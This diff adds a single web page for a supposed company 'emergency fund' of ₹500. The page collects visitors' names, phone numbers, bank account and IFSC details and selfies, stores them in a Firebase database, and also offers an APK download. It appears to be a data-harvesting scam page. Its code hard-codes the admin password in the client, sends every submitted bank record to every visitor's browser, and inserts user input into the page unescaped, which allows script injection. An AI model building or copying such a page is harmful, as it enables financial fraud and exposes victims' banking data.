@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ST Cottex Pvt Ltd</title>
+<link rel="manifest" href="manifest.json">
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+<script src="firebase.js"></script>
+<style>
+body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#e3f2fd,#fce4ec);margin:0;padding:0}
+.container{max-width:420px;margin:15px auto;background:#fff;padding:15px;border-radius:12px;box-shadow:0 5px 15px rgba(0,0,0,0.15)}
+.logo{width:110px;display:block;margin:0 auto 10px}
+h1{text-align:center;color:#1a237e;margin:5px 0}
+h2{text-align:center;font-size:14px;color:#555;margin:0}
+.notice{background:#fff3cd;color:#856404;padding:8px;border-radius:6px;font-size:13px;text-align:center;margin:10px 0}
+input,select,button{width:100%;padding:12px;margin-top:8px;border-radius:6px;border:1px solid #ccc;font-size:14px}
+button{background:#2e7d32;color:#fff;border:none;font-weight:bold}
+.whatsapp{background:#25d366;margin-top:10px}
+.download{background:#1e88e5;margin-top:10px}
+.list{margin-top:20px}
+.item{display:flex;justify-content:space-between;border-bottom:1px dashed #ddd;padding:6px 0;font-size:14px}
+.pending{color:orange;font-weight:bold}
+.success{color:green;font-weight:bold}
+.admin{display:none;max-width:480px;margin:20px auto;background:#fff;padding:15px;border-radius:10px}
+.admin h3{text-align:center}
+.lead{border:1px solid #ddd;padding:8px;margin:8px 0;border-radius:6px}
+.lead img{width:80px;border-radius:6px;display:block;margin-top:5px}
+</style>
+</head>
+<body>
+
+<div class="container" id="userSide">
+  <img src="logo.png" class="logo">
+  <h1>ST Cottex Pvt Ltd</h1>
+  <h2>Iraq Machiwada, Ludhiana, Punjab – 141115</h2>
+  <h2>Only for Company Workers</h2>
+
+  <div class="notice">
+    Emergency Fund ₹500 only<br>Selfie & Bank Details Mandatory
+  </div>
+
+  <input id="name" placeholder="Customer Name">
+  <input id="mobile" placeholder="Mobile Number">
+  <select id="type">
+    <option value="">Select Service</option>
+    <option value="Recharge">Recharge</option>
+    <option value="Emergency">Emergency Fund</option>
+  </select>
+
+  <input id="bank" placeholder="Bank Name (Emergency)">
+  <input id="account" placeholder="Account Number">
+  <input id="ifsc" placeholder="IFSC Code">
+  <input type="file" id="selfie" accept="image/*">
+
+  <button onclick="submitLead()">Submit</button>
+
+  <a href="https://wa.me/918264426101" target="_blank">
+    <button class="whatsapp">📱 WhatsApp Contact</button>
+  </a>
+
+  <a href="STCottexApp.apk" download>
+    <button class="download">⬇️ Download Application</button>
+  </a>
+
+  <div class="list">
+    <h3>Live Requests</h3>
+    <div id="publicList"></div>
+  </div>
+
+  <button onclick="openAdmin()">Admin Login</button>
+</div>
+
+<div class="admin" id="adminPanel">
+  <h3>Admin Panel</h3>
+  <div id="adminLeads"></div>
+</div>
+
+<script>
+const leadsRef = firebase.database().ref("leads");
+
+function renderPublic(leads){
+  const publicList = document.getElementById("publicList");
+  publicList.innerHTML="";
+  leads.forEach(l=>{
+    publicList.innerHTML+=`
+      <div class="item">
+        <span>${l.name}</span>
+        <span class="${l.status=='Pending'?'pending':'success'}">${l.status}</span>
+      </div>`;
+  });
+}
+
+// Load leads from Firebase
+leadsRef.on("value", snapshot=>{
+  let leads = [];
+  snapshot.forEach(s=>{
+    leads.push({...s.val(), id:s.key});
+  });
+  window.leads = leads;
+  renderPublic(leads);
+});
+
+// Submit lead
+function submitLead(){
+  const name = document.getElementById("name").value.trim();
+  const mobile = document.getElementById("mobile").value.trim();
+  const type = document.getElementById("type").value;
+  const bank = document.getElementById("bank").value;
+  const account = document.getElementById("account").value;
+  const ifsc = document.getElementById("ifsc").value;
+  const selfieFile = document.getElementById("selfie").files[0];
+
+  if(!name || !mobile || !type){alert("Fill required fields"); return;}
+  if(type=="Emergency" && (!bank || !account || !ifsc)){alert("Fill bank details"); return;}
+
+  const reader = new FileReader();
+  reader.onload = function(){
+    const lead = {name,mobile,type,bank,account,ifsc,selfie:reader.result || "",status:"Pending"};
+    leadsRef.push(lead);
+    alert("Lead submitted (Pending)");
+    location.reload();
+  };
+  if(selfieFile) reader.readAsDataURL(selfieFile);
+  else reader.onload();
+}
+
+// Admin Login
+function openAdmin(){
+  const p = prompt("Enter Admin Password");
+  if(p==="Manoj@143"){
+    document.getElementById("userSide").style.display="none";
+    document.getElementById("adminPanel").style.display="block";
+    renderAdmin();
+  }else alert("Wrong password");
+}
+
+// Render admin leads
+function renderAdmin(){
+  const adminLeads = document.getElementById("adminLeads");
+  adminLeads.innerHTML="";
+  window.leads.forEach(l=>{
+    adminLeads.innerHTML+=`
+      <div class="lead">
+        <b>${l.name}</b> (${l.type})<br>
+        Bank: ${l.bank}<br>
+        A/C: ${l.account}<br>
+        IFSC: ${l.ifsc}<br>
+        Status: <b>${l.status}</b><br>
+        ${l.selfie?`<img src="${l.selfie}">`:""}
+        <button onclick="markSuccess('${l.id}')">Mark Successful</button>
+      </div>`;
+  });
+}
+
+// Mark lead successful
+function markSuccess(id){
+  leadsRef.child(id).update({status:"Successful"});
+}
+</script>
+
+</body>
+</html>
